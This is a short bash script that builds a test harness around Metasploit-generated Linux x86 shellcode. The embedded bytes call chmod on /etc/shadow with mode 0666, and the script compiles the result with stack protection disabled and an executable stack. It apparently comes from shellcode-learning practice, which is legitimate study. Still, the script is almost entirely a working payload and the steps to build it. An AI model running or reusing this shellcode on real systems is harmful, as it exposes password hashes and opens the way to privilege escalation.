#!/bin/bash

#Filename: Chmod-compile.sh
#Author:  MrSquid
#Purpose: Chmod-compiler.

echo "[+] Generating code using metasploit..."

#msfvenom -p linux/x86/chmod  -f c  --> Shellcode generated to objdump

objdump="\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80";

sleep 3

echo "[+] Compiling shellcode.c and executing it.."

cp skeleton_shellcode.c shellcode.c  #Copy the skeleton of the shellcode (it contais a string named shellcode which it will be replaced with objdump)

replace "shellcode" "$objdump" -- shellcode.c &>/dev/null #Replace shellcode dump

sleep 2

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode &>/dev/null #Compile and execute the shellcode

